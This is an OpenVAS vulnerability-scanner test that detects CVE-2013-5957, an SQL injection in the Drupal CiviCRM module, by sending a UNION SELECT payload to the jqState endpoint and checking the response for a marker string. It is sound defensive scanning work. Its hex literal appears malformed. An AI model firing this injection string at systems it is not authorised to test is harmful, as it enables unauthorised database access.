###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_drupal_civicrm_mult_sql_injection_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Drupal Module CiviCRM '_value' Parameter SQL Injection Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:drupal:drupal";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804158");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2013-5957");
  script_bugtraq_id(64007);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-12-04 19:52:35 +0530 (Wed, 04 Dec 2013)");
  script_name("Drupal Module CiviCRM '_value' Parameter SQL Injection Vulnerability");


  script_tag(name:"summary", value:"This host is running CiviCRM and is prone to SQL injection vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
is possible to execute sql query.");
  script_tag(name:"solution", value:"Upgrade to CiviCRM version 4.2.12 or 4.3.7 or 4.4.beta4 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"insight", value:"The flaw is due to insufficient validation of '_value' HTTP GET parameter
passed to '/Location.php' script.");
  script_tag(name:"affected", value:"CiviCRM versions 4.2.x before 4.2.12, 4.3.x before 4.3.7, and 4.4.x before
4.4.beta4.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary SQL
commands in applications database and gain complete control over the vulnerable
web application.");

  script_xref(name:"URL", value:"http://civicrm.org/advisory/civi-sa-2013-009-sql-injection-vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("drupal_detect.nasl");
  script_mandatory_keys("drupal/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!drPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:drPort)){
  exit(0);
}

url= dir + "/?q=civicrm/ajax/jqState&_value=-1%20UNION%20SELECT%201," +
            "concat(0x673716C2D696E6A656374696F6E2D74657374)";

if(http_vuln_check(port:drPort, url:url, pattern:'sql-injection-test',
   extra_check:"name"))
{
  security_message(drPort);
  exit(0);
}
